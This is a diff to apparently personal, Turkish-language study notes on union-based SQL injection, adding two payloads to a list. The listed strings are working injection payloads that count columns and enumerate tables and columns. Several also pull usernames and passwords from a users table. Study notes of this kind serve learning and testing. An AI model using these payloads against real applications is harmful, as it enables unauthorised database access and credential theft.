@@ -1,4 +1,4 @@
-# UNION attacks
+# Union-Based SQL Injection
 
 ### Tanım
 - SELECT * FROM products WHERE category = 'Gifts' ...
@@ -29,6 +29,8 @@
 -------------------------------------
 
 - ==> ' UNION SELECT table_name, NULL FROM all_tables--
+- ==> '+UNION+SELECT+NULL,NULL,NULL--
+- ==> '+UNION+SELECT+'abc','def'--
 - ==> ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS'--
 - ==> ' UNION SELECT username, password FROM users--
 - ==> ' UNION SELECT NULL, username || '~' || password FROM users--
